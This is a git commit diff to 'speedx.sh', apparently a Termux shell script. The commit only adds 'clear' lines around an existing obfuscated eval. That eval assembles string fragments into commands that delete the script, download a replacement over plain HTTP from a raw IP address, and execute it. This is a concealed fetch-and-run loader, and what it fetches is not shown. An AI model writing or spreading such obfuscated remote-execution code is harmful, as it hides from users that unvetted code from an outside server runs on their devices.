49a425e07f1b082782f010a4c2471d661a9832b2
tgzin <75448283+tg230@users.noreply.github.com>
2023-12-08 19:06:16 -0300

    Update speedx.sh

--- speedx.sh
+++ speedx.sh
@@ -54,8 +54,10 @@
 
 
 
-
+clear
 
 z="
 ";Sz='peed';az='://$';Hz='rchi';Zz='http';bz='{mir';Yz=' -O ';Jz='mirr';jz='"$0"';Qz='ctor';Gz='r $a';Tz='xter';Xz='curl';Oz='1"';Uz='mux/';Pz='dire';Mz='75.9';Vz='menu';Kz='or="';Wz='/spe';gz='}';Bz='ive=';dz='/${d';Lz='168.';Az='arch';ez='irec';Rz='y="s';Fz='rm -';Cz='"spe';fz='tory';Nz='4.25';cz='ror}';Dz='edx.';Iz='ve';hz='exec';Ez='sh"';iz=' sh ';
 eval "$Az$Bz$Cz$Dz$Ez$z$Fz$Gz$Hz$Iz$z$Jz$Kz$Lz$Mz$Nz$Oz$z$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Dz$Ez$z$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$z$hz$iz$jz"
+
+clear
